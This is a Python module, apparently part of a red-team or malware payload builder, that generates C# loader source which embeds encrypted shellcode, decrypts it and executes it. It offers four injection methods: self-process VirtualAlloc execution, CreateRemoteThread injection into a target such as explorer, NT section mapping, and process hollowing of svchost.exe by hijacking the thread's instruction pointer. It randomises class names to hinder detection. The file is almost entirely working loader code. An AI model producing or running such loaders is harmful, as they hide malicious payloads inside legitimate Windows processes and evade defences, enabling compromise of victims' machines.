"""
C# (.NET) loader generator.

Injection method variants:
  valloc   – VirtualAlloc + CreateThread (self-process)
  pinject  – OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
  ntinject – NtCreateSection + NtMapViewOfSection + RtlCreateUserThread
  hollow   – Process Hollowing (CreateProcess SUSPENDED + inject image)
"""

from ..chain import decryption_stubs_cs
from ..utils import random_variable_name
import random


def generate(encrypted_bytes: bytes,
             chain_metadata: list[dict],
             injection_method: str = 'valloc',
             target_process: str = 'explorer') -> str:
    """
    Build a complete C# source file.

    Args:
        encrypted_bytes:  Final ciphertext.
        chain_metadata:   Per-stage metadata from chain.apply_chain().
        injection_method: 'valloc' | 'pinject' | 'ntinject' | 'hollow'
        target_process:   Process name for remote injection methods.

    Returns:
        Complete .cs source string.
    """
    helper_methods, call_seq = decryption_stubs_cs(chain_metadata)

    sc_hex = '{ ' + ', '.join(f'0x{b:02x}' for b in encrypted_bytes) + ' }'
    cls = random_variable_name(random.randint(8, 14))

    im = injection_method.lower()
    if im == 'valloc':
        inject_code = _INJECT_VALLOC
        extra_imports = ''
        pinvoke_decls = _PINVOKE_VALLOC
    elif im == 'pinject':
        inject_code = _INJECT_PINJECT.format(target=target_process)
        extra_imports = 'using System.Diagnostics;'
        pinvoke_decls = _PINVOKE_PINJECT
    elif im == 'ntinject':
        inject_code = _INJECT_NTINJECT
        extra_imports = 'using System.Diagnostics;'
        pinvoke_decls = _PINVOKE_NTINJECT
    elif im == 'hollow':
        inject_code = _INJECT_HOLLOW
        extra_imports = 'using System.Diagnostics;'
        pinvoke_decls = _PINVOKE_HOLLOW
    else:
        raise ValueError(f"Unknown injection method: '{injection_method}'. "
                         "Valid: valloc, pinject, ntinject, hollow")

    source = _TEMPLATE.format(
        extra_imports=extra_imports,
        cls=cls,
        sc_hex=sc_hex,
        helper_methods=helper_methods,
        call_seq=call_seq,
        pinvoke_decls=pinvoke_decls,
        inject_code=inject_code,
    )
    return source


# ---------------------------------------------------------------------------
# Main template
# ---------------------------------------------------------------------------

_TEMPLATE = """\
using System;
using System.Runtime.InteropServices;
using System.Text;
{extra_imports}

namespace {cls}Runner
{{
    class {cls}
    {{
        static byte[] encrypted = new byte[] {sc_hex};

{helper_methods}

{pinvoke_decls}

        static void Main(string[] args)
        {{
            byte[] buf = (byte[])encrypted.Clone();
            {call_seq}
            {inject_code}
        }}
    }}
}}
"""


# ---------------------------------------------------------------------------
# VirtualAlloc (self-process) – simplest, most compatible
# ---------------------------------------------------------------------------

_PINVOKE_VALLOC = """\
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
                                          IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);"""

_INJECT_VALLOC = """\
IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Marshal.Copy(buf, 0, ptr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);"""


# ---------------------------------------------------------------------------
# Remote process injection (CreateRemoteThread)
# ---------------------------------------------------------------------------

_PINVOKE_PINJECT = """\
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
                                            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer,
                                              int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
                                                uint dwStackSize, IntPtr lpStartAddress,
                                                IntPtr lpParameter, uint dwCreationFlags,
                                                IntPtr lpThreadId);"""

_INJECT_PINJECT = """\
var procs = System.Diagnostics.Process.GetProcessesByName("{target}");
            if (procs.Length == 0) {{ Console.Error.WriteLine("Target process not found"); return; }}
            IntPtr hProc = OpenProcess(0x001F0FFF, false, procs[0].Id);
            IntPtr remoteAddr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            IntPtr written;
            WriteProcessMemory(hProc, remoteAddr, buf, buf.Length, out written);
            CreateRemoteThread(hProc, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);"""


# ---------------------------------------------------------------------------
# NT Section injection (NtCreateSection + NtMapViewOfSection + RtlCreateUserThread)
# ---------------------------------------------------------------------------

_PINVOKE_NTINJECT = """\
        [DllImport("ntdll.dll")]
        static extern uint NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess,
                                           IntPtr ObjectAttributes, ref long MaximumSize,
                                           uint SectionPageProtection, uint AllocationAttributes,
                                           IntPtr FileHandle);

        [DllImport("ntdll.dll")]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle,
                                              ref IntPtr BaseAddress, UIntPtr ZeroBits,
                                              UIntPtr CommitSize, ref long SectionOffset,
                                              ref UIntPtr ViewSize, uint InheritDisposition,
                                              uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll")]
        static extern uint RtlCreateUserThread(IntPtr ProcessHandle, IntPtr SecurityDescriptor,
                                               bool CreateSuspended, uint StackZeroBits,
                                               UIntPtr StackReserve, UIntPtr StackCommit,
                                               IntPtr StartAddress, IntPtr StartParameter,
                                               ref IntPtr ThreadHandle, IntPtr ClientId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);"""

_INJECT_NTINJECT = """\
IntPtr hSection = IntPtr.Zero;
            long maxSize = buf.Length;
            NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref maxSize, 0x40, 0x8000000, IntPtr.Zero);

            IntPtr localBase = IntPtr.Zero, remoteBase = IntPtr.Zero;
            long sectionOffset = 0;
            UIntPtr viewSize = UIntPtr.Zero;
            IntPtr hSelf = GetCurrentProcess();

            // Map into current process (writable)
            NtMapViewOfSection(hSection, hSelf, ref localBase, UIntPtr.Zero, UIntPtr.Zero,
                               ref sectionOffset, ref viewSize, 2, 0, 0x04);
            sectionOffset = 0; viewSize = UIntPtr.Zero;
            // Map into target process (executable)
            NtMapViewOfSection(hSection, hSelf, ref remoteBase, UIntPtr.Zero, UIntPtr.Zero,
                               ref sectionOffset, ref viewSize, 2, 0, 0x20);

            Marshal.Copy(buf, 0, localBase, buf.Length);
            IntPtr hThread = IntPtr.Zero;
            RtlCreateUserThread(hSelf, IntPtr.Zero, false, 0,
                                UIntPtr.Zero, UIntPtr.Zero,
                                remoteBase, IntPtr.Zero, ref hThread, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);"""


# ---------------------------------------------------------------------------
# Process Hollowing
# ---------------------------------------------------------------------------

_PINVOKE_HOLLOW = """\
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO {{ public int cb; public string lpReserved, lpDesktop, lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
            public int dwFlags; public short wShowWindow, cbReserved2; public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError; }}

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION {{ public IntPtr hProcess, hThread;
            public int dwProcessId, dwThreadId; }}

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool CreateProcess(string lpApp, string lpCmd, IntPtr lpProcAttr,
                                         IntPtr lpThreadAttr, bool bInheritHandles,
                                         uint dwCreationFlags, IntPtr lpEnv, string lpDir,
                                         ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
                                             byte[] lpBuffer, int dwSize, out IntPtr lpBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
                                              byte[] lpBuffer, int nSize, out IntPtr lpBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize,
                                            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT64 {{
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags, MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] FltSave;
            public ulong Rflags;
            public ulong DebugControl, LastBranchToRip, LastBranchFromRip;
            public ulong LastExceptionToRip, LastExceptionFromRip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ulong[] VectorRegister;
            public ulong VectorControl;
        }}"""

_INJECT_HOLLOW = """\
string targetExe = @"C:\\Windows\\System32\\svchost.exe";
            STARTUPINFO si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;
            if (!CreateProcess(targetExe, null, IntPtr.Zero, IntPtr.Zero, false,
                               0x4, IntPtr.Zero, null, ref si, out pi))
            {{ Console.Error.WriteLine("CreateProcess failed"); return; }}

            // Allocate remote memory for shellcode
            IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            IntPtr written;
            WriteProcessMemory(pi.hProcess, remoteAddr, buf, buf.Length, out written);

            // Hijack Rip to our shellcode
            CONTEXT64 ctx = new CONTEXT64(); ctx.ContextFlags = 0x10001B; // CONTEXT_FULL
            ctx.FltSave = new byte[512]; ctx.VectorRegister = new ulong[6];
            GetThreadContext(pi.hThread, ref ctx);
            ctx.Rip = (ulong)remoteAddr.ToInt64();
            SetThreadContext(pi.hThread, ref ctx);
            ResumeThread(pi.hThread);
            WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);"""
